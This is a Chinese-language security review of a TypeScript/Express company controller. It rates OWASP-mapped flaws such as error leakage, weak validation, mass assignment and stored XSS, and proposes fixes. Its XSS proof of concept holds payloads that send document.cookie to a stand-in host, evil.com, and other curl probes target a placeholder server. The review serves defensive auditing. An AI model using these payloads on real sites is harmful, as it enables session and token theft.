# apis/controller/company.controller.ts — 代码安全专家评审报告

**评审日期**: 2026-05-24
**评审角色**: 代码安全专家（OWASP Top 10 + API 安全 + 输入验证 + 信息泄露 + 权限控制）
**文件路径**: `apis/controller/company.controller.ts`
**代码行数**: 237 行
**关联文件**: `apis/service/impl/company.service.impl.ts`, `apis/entity/company.entity.ts`, `apis/utils/response.util.ts`, `apis/middleware/auth.middleware.ts`, `apis/app.ts`, `prisma/schema.prisma`
**安全评级**: ⚠️ MEDIUM（中风险 — 无远程可利用的 CRITICAL 漏洞，但存在多处信息泄露与验证缺失）

---

## 一、安全评价总览

从代码安全专家视角审视，`company.controller.ts` 的整体安全态势为**中风险**。路由层已通过 `authMiddleware + roleMiddleware('sysadmin')` 限制所有 5 个端点仅系统管理员可访问（见 `app.ts:108-112`），认证与授权边界在中间件层完成，Prisma ORM 天然防止 SQL 注入。以上是显著的正面发现。

但该文件仍存在以下安全隐患：

| OWASP 分类 | 安全风险 | 严重级别 | 状态 |
|------------|----------|----------|------|
| A05:2021 — 安全配置错误 | `err.message` 泄露数据库内部信息 | HIGH | ❌ 未修复 |
| A03:2021 — 注入 | 输入验证薄弱，缺少类型/格式/长度校验 | HIGH | ❌ 未修复 |
| A01:2021 — 失效的访问控制 | operator_ids 未校验跨公司关联风险 | MEDIUM | ❌ 未修复 |
| A08:2021 — 软件和数据完整性 | req.body 整体传入 Service（批量赋值风险） | MEDIUM | ❌ 未修复 |
| A04:2021 — 不安全的设计 | Service 异常通过字符串匹配检测（脆弱设计） | MEDIUM | ⚠️ 设计缺陷 |
| A05:2021 — 安全配置错误 | catch 使用 `err: any`，类型安全缺失 | LOW | ⚠️ 防御不足 |

---

## 二、安全漏洞详情

### SEC-H-01: 错误消息泄露数据库内部信息（OWASP A05）

**严重级别**: HIGH
**位置**: 第 24、59、128、209、234 行（全部 5 个 catch 块）
**OWASP 分类**: A05:2021 — Security Misconfiguration

```typescript
} catch (err: any) {
  fail(res, 500, err.message || '创建公司失败');  // ❌ Prisma 错误直接暴露
}
```

**攻击场景分析**:

1. **数据库结构泄露**: 当 `operator_ids` 中包含不存在的用户 ID 时，Prisma 抛出：
   ```
   No User found with id 99999
   ```
   攻击者可利用此消息确认用户 ID 是否存在（用户枚举）。

2. **约束信息泄露**: 若 `contact_phone` 超过 `VarChar(20)` 长度限制，Prisma 抛出：
   ```
   Value too long for column 'contact_phone' on model 'Company'. Expected length: 20, got: 200
   ```
   暴露数据库字段名、类型和长度约束。

3. **连接信息泄露**: 数据库不可用时可能泄露：
   ```
   Can't reach database server at localhost:5432
   ```
   暴露数据库服务器地址和端口。

4. **外键约束泄露**: `operator_ids` 关联的用户已属于其他公司时：
   ```
   Foreign key constraint failed on the field: User_companyId_fkey
   ```
   暴露数据库关系结构。

**影响评估**:
- **攻击者**: sysadmin 角色用户（可信程度较高，但仍应遵循最小权限原则）
- **攻击复杂度**: 低 — 仅需构造异常输入即可触发
- **信息价值**: 数据库表名、字段名、约束名、连接信息 — 可用于构造更精准的攻击
- **风险缓解因素**: 端点限制为 sysadmin 角色，降低了被外部攻击者利用的可能

**修复方案**:

```typescript
} catch (err: unknown) {
  // 已知业务异常精确匹配
  if (err instanceof NotFoundError) {
    fail(res, 404, err.message);
    return;
  }
  // 未知异常：记录日志，返回通用消息
  logger.error('[CompanyController] 未预期错误', { error: err, path: req.path });
  fail(res, 500, '服务器内部错误，请稍后重试');
}
```

**严重性判断**: 虽然端点限制为 sysadmin，但错误消息泄露仍违反安全最佳实践，在合规审计中会被标记。评为 HIGH 是因为影响范围覆盖全部 5 个端点。

---

### SEC-H-02: 输入验证严重不足 — 缺少类型/格式/长度校验（OWASP A03）

**严重级别**: HIGH
**位置**: 第 113-123 行（createCompany）、第 191-200 行（updateCompany）
**OWASP 分类**: A03:2021 — Injection

```typescript
const { short_name, full_name, contact_person, contact_phone, operator_ids } = req.body;

if (!short_name || !full_name || !contact_person || !contact_phone) {  // ❌ 仅 truthy 检查
  fail(res, 400, '...');
}

if (!Array.isArray(operator_ids) || operator_ids.length === 0) {  // ❌ 未校验元素类型
  fail(res, 400, '...');
}
```

**攻击向量分析**:

| 攻击向量 | 输入值 | 绕过验证 | 后果 |
|----------|--------|----------|------|
| 类型混淆 | `short_name: [1,2,3]` | truthy 检查通过 | Prisma 运行时错误 → 信息泄露（SEC-H-01） |
| 超长字符串 | `short_name: "A".repeat(10000)` | 无长度限制 | Prisma 错误或数据库异常 |
| 非法手机号 | `contact_phone: "<script>alert(1)</script>"` | 无格式校验 | 存储型 XSS 风险（若前端未转义） |
| 恶意数组元素 | `operator_ids: [null, -1, 3.14, "abc"]` | `Array.isArray` 通过 | Prisma `RecordNotFound` → 信息泄露 |
| 原型污染 | `operator_ids: []` 传入 `__proto__` | 未冻结对象 | 理论上的原型污染风险 |
| 整数溢出 | `operator_ids: [2147483648]` | 无范围检查 | 数据库整数溢出或意外行为 |

**PoC（概念验证） — 类型混淆攻击**:

```bash
# 发送数组作为 short_name
curl -X POST http://target/api/companies \
  -H "Authorization: Bearer <sysadmin-token>" \
  -H "Content-Type: application/json" \
  -d '{"short_name": [1,2,3], "full_name": "x", "contact_person": "x", "contact_phone": "x", "operator_ids": [1]}'

# 响应可能包含 Prisma 错误信息：
# {"code": 500, "message": "Expected String, got [1,2,3] for field 'shortName' on model 'Company'"}
```

**PoC — 超长字符串攻击**:

```bash
# 发送超长字符串测试字段长度限制
curl -X POST http://target/api/companies \
  -H "Authorization: Bearer <sysadmin-token>" \
  -H "Content-Type: application/json" \
  -d '{"short_name": "A...10000chars", "full_name": "x", "contact_person": "x", "contact_phone": "x", "operator_ids": [1]}'

# 响应可能包含：
# {"code": 500, "message": "Value too long for column 'short_name' on model 'Company'. Expected: 50, got: 10000"}
```

**修复方案**: 使用 Zod 进行严格的 schema 验证：

```typescript
import { z } from 'zod';

const companyBodySchema = z.object({
  short_name: z.string().min(1).max(50),
  full_name: z.string().min(1).max(200),
  address: z.string().max(500).optional(),
  contact_person: z.string().min(1).max(100),
  contact_phone: z.string().regex(/^1[3-9]\d{9}$/, '手机号格式不正确'),
  operator_ids: z.array(z.number().int().positive()).min(1, '运营者不能为空'),
  viewer_ids: z.array(z.number().int().positive()).optional(),
}).strict();  // strict() 拒绝未定义的字段

// 在 Controller 中使用
const parsed = companyBodySchema.safeParse(req.body);
if (!parsed.success) {
  fail(res, 400, parsed.error.issues.map(i => i.message).join('; '));
  return;
}
```

---

### SEC-H-03: 存储型 XSS 风险 — 字符串字段未做 HTML 净化

**严重级别**: HIGH（条件性 — 取决于前端渲染方式）
**位置**: 第 125、203 行（createCompany、updateCompany 的 req.body 传入）
**OWASP 分类**: A03:2021 — Injection（XSS 变体）

```typescript
// req.body 中的字符串字段直接传入 Service → Prisma 写入数据库
const company = await companyService.create(req.body);
```

**攻击场景**:

```bash
# 注入恶意脚本到公司名称
curl -X POST http://target/api/companies \
  -H "Authorization: Bearer <sysadmin-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "short_name": "<img src=x onerror=fetch(\"https://evil.com/steal?\"+document.cookie)>",
    "full_name": "正常公司名",
    "contact_person": "<script>document.location=\"https://evil.com?c=\"+document.cookie</script>",
    "contact_phone": "13800138000",
    "operator_ids": [1]
  }'
```

**影响分析**:
- **前提条件**: 前端使用 `dangerouslySetInnerHTML` 或 `v-html` 等不安全的渲染方式展示公司信息
- **攻击效果**: 当其他用户（包括 admin/view 角色）查看公司列表或详情时，执行恶意脚本
- **窃取目标**: JWT token（存储在 localStorage）、用户 session 信息
- **风险缓解因素**: 前端使用 React（默认转义 HTML），但 `dangerouslySetInnerHTML` 的使用无法排除

**修复方案**: 在 Controller 或 Service 层对字符串输入进行 HTML 实体编码：

```typescript
import { z } from 'zod';

// 自定义 sanitizer
const sanitizedString = z.string().transform(val =>
  val.replace(/&/g, '&amp;')
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;')
     .replace(/"/g, '&quot;')
     .replace(/'/g, '&#x27;')
);

const companyBodySchema = z.object({
  short_name: sanitizedString.min(1).max(50),
  full_name: sanitizedString.min(1).max(200),
  // ...
});
```

**严重性判断**: 虽然 React 默认转义 HTML 降低了风险，但作为安全最佳实践，后端仍应在入库前净化输入。评为 HIGH 是因为如果前端存在任何不安全渲染点，影响范围是所有访问公司信息的用户。

---

### SEC-M-01: operator_ids 缺少跨公司关联校验 — 水平越权风险

**严重级别**: MEDIUM
**位置**: `company.service.impl.ts:50-55`、`company.service.impl.ts:95-100`
**OWASP 分类**: A01:2021 — Broken Access Control

```typescript
// company.service.impl.ts — create 方法
for (const operatorId of request.operator_ids) {
  await tx.user.update({
    where: { id: operatorId },  // ❌ 未检查用户当前是否已关联其他公司
    data: { companyId: company.id },
  });
}
```

**攻击场景**:

```bash
# sysadmin-A 将属于公司 X 的管理员用户静默转移到公司 Y
curl -X PUT http://target/api/companies/2 \
  -H "Authorization: Bearer <sysadmin-A-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "short_name": "目标公司",
    "full_name": "目标公司全名",
    "contact_person": "张三",
    "contact_phone": "13800138000",
    "operator_ids": [5]  // 用户5原本属于公司1，现被转移到公司2
  }'
```

**影响分析**:
1. **用户静默转移**: 被指定的用户在不知情的情况下被关联到新公司
2. **数据完整性破坏**: 原 公司失去了管理员，可能导致运营瘫痪
3. **审计缺失**: 操作未产生告警或确认流程
4. **IDOR（Insecure Direct Object Reference）**: 通过遍历 `operator_ids` 可操纵任意用户的公司归属

**修复方案**: Service 层在事务内添加前置校验：

```typescript
// 检查 operator_ids 中是否有已关联其他公司的用户
const usersToUpdate = await tx.user.findMany({
  where: { id: { in: request.operator_ids } },
  select: { id: true, companyId: true, cnName: true },
});

const alreadyAssigned = usersToUpdate.filter(u => u.companyId !== null && u.companyId !== id);
if (alreadyAssigned.length > 0) {
  throw new ConflictError(
    `以下用户已关联其他公司: ${alreadyAssigned.map(u => u.cnName).join(', ')}`
  );
}
```

---

### SEC-M-02: 批量赋值风险 — req.body 整体传入 Service 层

**严重级别**: MEDIUM
**位置**: 第 125、203 行
**OWASP 分类**: A08:2021 — Software and Data Integrity Failures

```typescript
const company = await companyService.create(req.body);   // ❌ req.body 整体传入
const company = await companyService.update(id, req.body); // ❌ 同上
```

**问题分析**:

`req.body` 的类型为 `any`（Express 类型定义），可包含任意字段。虽然当前 Service 层通过显式字段赋值避免了实际的批量赋值漏洞：

```typescript
// company.service.impl.ts — 显式字段赋值（安全）
const company = await tx.company.create({
  data: {
    shortName: request.short_name,  // ✓ 仅使用已知字段
    fullName: request.full_name,
    // ...
  },
});
```

但这形成了一个**隐式安全依赖** — Controller 的安全性依赖于 Service 的实现细节。如果未来有人将 Service 改为展开赋值：

```typescript
// 危险重构（如果有人这样改）
const company = await tx.company.create({ data: request });  // ❌ 批量赋值
```

将导致攻击者可以设置 `status`、`createdAt`、`updatedAt` 等任意字段。

**攻击 PoC**:

```bash
# 尝试注入额外字段
curl -X POST http://target/api/companies \
  -H "Authorization: Bearer <sysadmin-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "short_name": "测试公司",
    "full_name": "测试公司全名",
    "contact_person": "张三",
    "contact_phone": "13800138000",
    "operator_ids": [1],
    "status": false,
    "id": 0,
    "createdAt": "2099-01-01T00:00:00Z"
  }'
```

**修复方案**: Controller 层显式构造类型安全的请求对象：

```typescript
const createRequest: CreateCompanyRequest = {
  short_name,
  full_name,
  address: req.body.address,
  contact_person,
  contact_phone,
  operator_ids,
  viewer_ids: req.body.viewer_ids,
};
const company = await companyService.create(createRequest);
```

配合 Zod 的 `.strict()` 模式，拒绝未定义字段。

---

### SEC-M-03: 模块级单例实例化 — 潜在的状态共享风险

**严重级别**: MEDIUM（低可能性，高影响）
**位置**: 第 5 行
**OWASP 分类**: A04:2021 — Insecure Design

```typescript
const companyService = new CompanyServiceImpl();  // 模块级单例
```

**问题分析**:

`CompanyServiceImpl` 通过 `getPrisma()` 获取 Prisma 实例。如果 `getPrisma()` 返回的是共享实例而非每次创建新连接，那么：

1. **连接泄漏**: 多个请求共享同一 Prisma Client 实例，如果某次操作导致连接异常，可能影响后续所有请求
2. **事务交叉**: 虽然当前使用 `$transaction` 管理事务边界，但理论上共享的 Prisma 实例在高并发下可能出现事务交叉
3. **测试污染**: 单例模式在测试中难以隔离，可能导致测试间的状态泄漏

**缓解因素**: Prisma Client 本身设计为连接池模式，`getPrisma()` 如果返回单例是正确做法。

**修复建议**: 无需立即修改，但建议在代码中添加注释说明设计意图，并确保 `getPrisma()` 返回单例实例。

---

### SEC-M-04: Service 层异常通过字符串匹配 — 脆弱的安全检测

**严重级别**: MEDIUM
**位置**: 第 58、206、231 行
**OWASP 分类**: A04:2021 — Insecure Design

```typescript
} catch (err: any) {
  if (err.message === '公司不存在') {  // ❌ 脆弱的字符串精确匹配
    fail(res, 404, err.message);
  } else {
    fail(res, 500, err.message || '...');  // ❌ 未匹配的全部泄露
  }
}
```

**安全影响**:

1. **绕过风险**: 如果 Service 层修改错误消息（如增加空格、"该公司不存在"），Controller 的匹配失效，业务异常被当作 500 返回并泄露完整错误消息
2. **欺骗风险**: 攻击者如果能控制 Prisma 的错误消息（理论上非常困难），可能构造出匹配 `err.message === '公司不存在'` 的字符串，触发错误的 404 响应
3. **覆盖不完整**: 目前只匹配 `'公司不存在'`，其他可能的业务异常（如 "用户已关联其他公司"）全部走 500 逻辑

**修复方案**: 引入类型安全的异常体系：

```typescript
// apis/errors/index.ts
export class AppError extends Error {
  constructor(
    message: string,
    public readonly statusCode: number,
    public readonly code: string
  ) {
    super(message);
    this.name = this.constructor.name;
  }
}

export class NotFoundError extends AppError {
  constructor(entity: string) {
    super(`${entity}不存在`, 404, 'NOT_FOUND');
  }
}

export class ConflictError extends AppError {
  constructor(message: string) {
    super(message, 409, 'CONFLICT');
  }
}

// Controller 统一错误处理
} catch (err: unknown) {
  if (err instanceof AppError) {
    fail(res, err.statusCode, err.message);
  } else {
    logger.error('未预期错误', err);
    fail(res, 500, '服务器内部错误');
  }
}
```

---

### SEC-L-01: catch 块使用 `err: any` — 类型安全缺失

**严重级别**: LOW
**位置**: 第 23、57、127、205、230 行
**OWASP 分类**: A05:2021 — Security Misconfiguration

```typescript
} catch (err: any) {  // ❌ 应使用 unknown
```

`any` 类型允许直接访问 `err.message`、`err.stack` 等属性而不做类型窄化，增加了意外泄露敏感信息的风险。使用 `unknown` 强制进行 `instanceof` 检查，从语言层面提供安全保障。

---

### SEC-L-02: `parseInt(req.params.id as string, 10)` — 冗余类型断言

**严重级别**: LOW（代码质量 — 影响可审计性）
**位置**: 第 50、185、216 行

`req.params.id` 已为 `string` 类型，`as string` 断言冗余。虽然不是直接安全问题，但冗余的类型断言可能掩盖真实的类型不匹配问题，降低代码审查效率。

---

### SEC-L-03: 缺少请求体大小限制

**严重级别**: LOW
**位置**: 整个文件（Express 中间件层配置）

虽然 `rate-limit.middleware.ts` 限制了请求频率，但未看到明确的请求体大小限制。如果攻击者发送超大 JSON 请求体（如 `operator_ids` 包含数万个元素），可能导致：
1. 内存消耗过大（DoS）
2. 事务内循环执行数万次数据库更新

**修复建议**: 在 Express 全局配置中添加 body 大小限制：

```typescript
app.use(express.json({ limit: '10kb' }));
```

---

## 三、安全防御正面发现

| 防御措施 | 位置 | 评价 |
|----------|------|------|
| JWT 认证中间件 | `auth.middleware.ts` | ✓ 基于标准 JWT 库，token 过期处理正确 |
| 角色授权 — sysadmin 限制 | `app.ts:108-112` | ✓ 所有 5 个端点均限制为 sysadmin 角色 |
| Prisma 参数化查询 | `company.service.impl.ts` | ✓ 天然防止 SQL 注入 |
| ID 参数验证 | 第 50-53、185-188、216-219 行 | ✓ `parseInt + isNaN` 模式一致执行 |
| 状态参数类型守卫 | 第 223-225 行 | ✓ `typeof status !== 'boolean'` 正确实现 |
| 反爬虫中间件 | `anti-crawl.middleware.ts` | ✓ User-Agent 检查 + IP 频率限制 |
| 速率限制 | `rate-limit.middleware.ts` | ✓ 基于 `express-rate-limit` |
| 显式字段赋值 | `company.service.impl.ts` | ✓ Service 层逐字段赋值，避免批量赋值 |
| 事务管理 | `company.service.impl.ts` | ✓ 使用 Prisma `$transaction` 保证原子性 |
| 无 console.log | 整个文件 | ✓ 生产代码无调试输出 |

---

## 四、攻击面总结

```
┌─────────────────────────────────────────────────────────────┐
│                    攻击面分析图                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  攻击者 (sysadmin)                                          │
│       │                                                     │
│       ▼                                                     │
│  ┌─────────────────┐                                        │
│  │ JWT Auth ✅     │ ← 已防御                                │
│  │ Role: sysadmin  │ ← 已防御                                │
│  │ Rate Limit ✅   │ ← 已防御                                │
│  │ Anti-Crawl ✅   │ ← 已防御                                │
│  └────────┬────────┘                                        │
│           ▼                                                 │
│  ┌─────────────────┐                                        │
│  │ Controller      │                                        │
│  │                 │                                        │
│  │ ❌ 输入验证薄弱  │ ← SEC-H-02: 类型/格式/长度未校验         │
│  │ ❌ XSS 未净化   │ ← SEC-H-03: HTML 实体未编码             │
│  │ ❌ 批量赋值风险  │ ← SEC-M-02: req.body 整体传入           │
│  │ ❌ 错误消息泄露  │ ← SEC-H-01: err.message 直接返回       │
│  └────────┬────────┘                                        │
│           ▼                                                 │
│  ┌─────────────────┐                                        │
│  │ Service Layer   │                                        │
│  │                 │                                        │
│  │ ❌ 跨公司关联   │ ← SEC-M-01: operator_ids 未校验         │
│  │ ✓ 事务管理     │                                        │
│  │ ✓ 显式字段赋值  │                                        │
│  └────────┬────────┘                                        │
│           ▼                                                 │
│  ┌─────────────────┐                                        │
│  │ Prisma/Database │                                        │
│  │                 │                                        │
│  │ ✓ 参数化查询   │ ← SQL 注入已防御                         │
│  │ ✓ 字段长度约束  │ ← VarChar 限制                          │
│  └─────────────────┘                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 五、修复优先级与工作量估算

### 第一阶段：紧急修复（0.5 天）

| 优先级 | 编号 | 问题 | 修复方案 | 工作量 |
|--------|------|------|----------|--------|
| P1 | SEC-H-01 | 错误消息泄露 | 500 统一返回通用消息 + 日志 | 1h |
| P1 | SEC-H-02 | 输入验证不足 | 引入 Zod schema | 2h |
| P1 | SEC-M-02 | 批量赋值风险 | Controller 显式构造请求对象 | 0.5h |

### 第二阶段：短期改进（1 天）

| 优先级 | 编号 | 问题 | 修复方案 | 工作量 |
|--------|------|------|----------|--------|
| P2 | SEC-H-03 | 存储型 XSS | 输入 HTML 净化 | 1h |
| P2 | SEC-M-01 | 跨公司关联 | Service 层添加关联校验 | 2h |
| P2 | SEC-M-04 | 异常检测脆弱 | 引入 AppError 异常体系 | 3h |

### 第三阶段：加固优化

| 优先级 | 编号 | 问题 | 修复方案 | 工作量 |
|--------|------|------|----------|--------|
| P3 | SEC-L-01 | `err: any` | 改为 `unknown` + instanceof | 1h |
| P3 | SEC-L-03 | 请求体无大小限制 | Express 全局限制 | 0.5h |

---

## 六、与 OWASP Top 10 (2021) 映射

| OWASP 编号 | 分类 | 本文件涉及 | 具体问题 |
|------------|------|-----------|----------|
| A01 | 失效的访问控制 | ✅ | SEC-M-01: operator_ids 跨公司关联 |
| A02 | 加密机制失败 | — | 不涉及（JWT 认证在中间件层处理） |
| A03 | 注入 | ✅ | SEC-H-02: 输入验证不足; SEC-H-03: XSS |
| A04 | 不安全的设计 | ✅ | SEC-M-03: 单例模式; SEC-M-04: 字符串匹配异常 |
| A05 | 安全配置错误 | ✅ | SEC-H-01: 错误消息泄露; SEC-L-01: `any` 类型 |
| A06 | 过期组件 | — | 不涉及（需依赖审计） |
| A07 | 身份认证失败 | — | 不涉及（中间件层处理） |
| A08 | 软件和数据完整性失败 | ✅ | SEC-M-02: 批量赋值风险 |
| A09 | 安全日志和监控不足 | ✅ | SEC-H-01: 未记录详细错误日志 |
| A10 | 服务端请求伪造 | — | 不涉及 |

---

## 七、评审结论

**判定: ⚠️ 中风险 — 需要修复但无立即阻断性安全漏洞**

### 核心风险摘要

1. **信息泄露（SEC-H-01）** — 最高优先级。所有 5 个端点的 `err.message` 直接返回客户端，可能泄露数据库内部信息。虽然仅 sysadmin 可访问，但违反合规要求。
2. **输入验证缺失（SEC-H-02）** — 无类型、格式、长度校验，依赖 Prisma 的隐式防御。一旦 Prisma 错误消息泄露（SEC-H-01），形成攻击链。
3. **存储型 XSS（SEC-H-03）** — 字符串输入未做 HTML 净化，若前端存在不安全渲染点，可导致 JWT 窃取。

### 风险缓解因素

- 所有端点限制为 sysadmin 角色，大幅缩小攻击面
- Prisma ORM 防止 SQL 注入
- React 框架默认转义 HTML（但不应依赖前端防御）
- 速率限制和反爬虫中间件提供额外的暴力破解防护

### 建议

- **立即**: 修复 SEC-H-01（错误消息脱敏）和 SEC-H-02（Zod 验证），消除攻击链
- **短期**: 引入统一异常体系（SEC-M-04），从根本上解决错误处理安全问题
- **长期**: 建立项目级安全编码规范，确保所有 Controller 遵循统一的输入验证和错误处理模式

---

*代码安全专家评审完成 — 2026-05-24*
